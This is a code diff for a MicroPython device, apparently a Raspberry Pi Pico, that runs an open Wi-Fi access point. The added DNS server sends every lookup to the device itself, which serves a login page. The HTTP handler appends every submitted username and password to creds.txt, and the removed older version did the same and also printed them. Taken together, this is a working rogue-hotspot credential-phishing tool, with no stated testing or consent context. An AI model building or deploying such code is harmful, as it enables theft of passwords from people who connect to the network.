@@ -1,55 +1,198 @@
+# Big thanks to Chris Hager for the original code.
+# You can find him at <chris@linuxuser.at> or https://github.com/metachris/
+import gc
+import sys
 import network
 import socket
-import ure
-import machine
-import time
+import uasyncio as asyncio
+from machine import Pin
 
-CREDENTIALS_FILE = "creds.txt"
+# Helper to detect uasyncio v3
+IS_UASYNCIO_V3 = hasattr(asyncio, "__version__") and asyncio.__version__ >= (3,)
 
-def start_http_server():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('', 80))
-    s.listen(5)
-    print("HTTP server started on port 80")
+wifi_interface = network.WLAN(network.AP_IF)
 
-    while True:
-        conn, addr = s.accept()
-        print('Got a connection from %s' % str(addr))
+# DNS settings
+SERVER_IP = '192.168.4.1'
 
-        request = conn.recv(1024).decode('utf-8')
-        print('Content = %s' % request)
 
-        if "POST" in request:
-            match = ure.search(r"username=([^&]*)&password=([^&]*)", request)
-            if match:
-                username = match.group(1).replace("+", " ")
-                password = match.group(2).replace("+", " ")
-                save_credentials(username, password)
+# Start the access point, slightly different from the original code as pico handles the wifi differently
+def start_access_point(local_ip="192.168.4.1", essid=None, password=None):
+    if essid is None:
+        essid = "test"
 
-            response = b"HTTP/1.1 302 Found\r\nLocation: /\r\n\r\n"
-            conn.send(response)
+    if password:
+        wifi_interface.config(essid=essid, security=3, password=password)
+    else:
+        wifi_interface.config(essid=essid, security=0)
+
+    wifi_interface.active(True)
+
+
+def _handle_exception(loop, context):
+    """ uasyncio v3 only: global exception handler """
+    sys.print_exception(context["exception"])
+    sys.exit()
+
+
+class DNSQuery:
+    def __init__(self, data):
+        self.data = data
+        self.domain = ''
+        tipo = (data[2] >> 3) & 15  # Opcode bits
+        if tipo == 0:  # Standard query
+            ini = 12
+            lon = data[ini]
+            while lon != 0:
+                self.domain += data[ini + 1:ini + lon + 1].decode('utf-8') + '.'
+                ini += lon + 1
+                lon = data[ini]
+
+    def response(self, ip):
+        """Generate DNS response packet."""
+        if self.domain:
+            packet = self.data[:2] + b'\x81\x80'
+            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'  # Questions and Answers Counts
+            packet += self.data[12:]  # Original Domain Name Question
+            packet += b'\xC0\x0C'  # Pointer to domain name
+            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3C\x00\x04'  # Response type, ttl and resource data length -> 4 bytes
+            packet += bytes(map(int, ip.split('.')))  # 4bytes of IP
+        return packet
+
+
+# Define the button to stop
+button_left = [Pin(13, Pin.IN, Pin.PULL_UP), Pin(6, Pin.IN, Pin.PULL_UP)]
+
+
+class MyApp:
+    def __init__(self):
+        self.stop_requested = False
+
+    def setup_button_interrupts(self):
+        """Set up button interrupts to stop the captive portal."""
+        for btn in button_left:
+            btn.irq(trigger=Pin.IRQ_FALLING, handler=self.request_stop)
+
+    def request_stop(self, pin):
+        """Handler to set stop_requested flag."""
+        self.stop_requested = True
+
+    async def start(self):
+        # Get the event loop
+        loop = asyncio.get_event_loop()
+
+        # Add global exception handler
+        if IS_UASYNCIO_V3:
+            loop.set_exception_handler(_handle_exception)
+
+        # Set up button interrupts
+        self.setup_button_interrupts()
+
+        # Start the wifi AP
+        start_access_point()
+
+        # Create the server and add task to event loop
+        server = asyncio.start_server(self.handle_http_connection, "0.0.0.0", 80)
+        self.server_task = loop.create_task(server)
+
+        # Start the DNS server task
+        self.dns_task = loop.create_task(self.run_dns_server())
+
+        # Start looping forever
+        while not self.stop_requested:
+            await asyncio.sleep(0.1)
+
+        await self.stop()
+
+    async def handle_http_connection(self, reader, writer):
+        gc.collect()
+
+        # Get HTTP request line
+        data = await reader.readline()
+        request_line = data.decode()
+
+        # Read headers to handle POST data
+        content_length = 0
+        while True:
+            gc.collect()
+            line = await reader.readline()
+            if line == b'\r\n':
+                break
+            if line.lower().startswith(b'content-length:'):
+                content_length = int(line.decode().split(':')[1].strip())
+
+        # Handle POST requests
+        if "POST" in request_line:
+            post_data = await reader.read(content_length)
+            params = dict(item.split('=') for item in post_data.decode().split('&'))
+            username = params.get('username', '')
+            password = params.get('password', '')
+            with open('creds.txt', 'a') as f:
+                f.write(f"{username} : {password}\n")
+            response = 'HTTP/1.0 200 OK\r\n\r\nCredentials saved.'
         else:
-            response = web_page()
-            conn.send(response)
+            # Handle GET requests
+            response = 'HTTP/1.0 200 OK\r\n\r\n'
+            with open('index.html') as f:
+                response += f.read()
 
-        conn.close()
+        await writer.awrite(response)
+        await writer.aclose()
 
-def web_page():
-    return b"""HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
-    <html>
-    <head><title>Login</title></head>
-    <body>
-        <h2>Please login</h2>
-        <form action="/" method="post">
-            Username: <input type="text" name="username"><br>
-            Password: <input type="password" name="password"><br>
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    """
+    async def run_dns_server(self):
+        """Function to handle incoming DNS requests."""
+        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udps.setblocking(False)
+        udps.bind(('0.0.0.0', 53))
 
-def save_credentials(username, password):
-    with open(CREDENTIALS_FILE, "a") as f:
-        f.write(f"{username},{password}\n")
-    print("Saved credentials:", username, password)
+        while not self.stop_requested:
+            try:
+                if IS_UASYNCIO_V3:
+                    yield asyncio.core._io_queue.queue_read(udps)
+                else:
+                    yield asyncio.IORead(udps)
+                data, addr = udps.recvfrom(4096)
+
+                DNS = DNSQuery(data)
+                udps.sendto(DNS.response(SERVER_IP), addr)
+
+            except Exception:
+                await asyncio.sleep_ms(3000)
+
+        udps.close()
+
+    # Stop the server
+    async def stop(self):
+        if hasattr(self, 'server_task') and self.server_task:
+            self.server_task.cancel()
+            try:
+                await self.server_task
+            except asyncio.CancelledError:
+                pass
+
+        if hasattr(self, 'dns_task') and self.dns_task:
+            self.dns_task.cancel()
+            try:
+                await self.dns_task
+            except asyncio.CancelledError:
+                pass
+
+        loop = asyncio.get_event_loop()
+        loop.stop()
+        wifi_interface.active(False)
+
+
+def startup():
+    """Main code entrypoint."""
+    try:
+        myapp = MyApp()
+        if IS_UASYNCIO_V3:
+            asyncio.run(myapp.start())
+        else:
+            loop = asyncio.get_event_loop()
+            loop.run_until_complete(myapp.start())
+    except Exception:
+        pass
+    finally:
+        if IS_UASYNCIO_V3:
+            asyncio.new_event_loop()  # Clear retained state
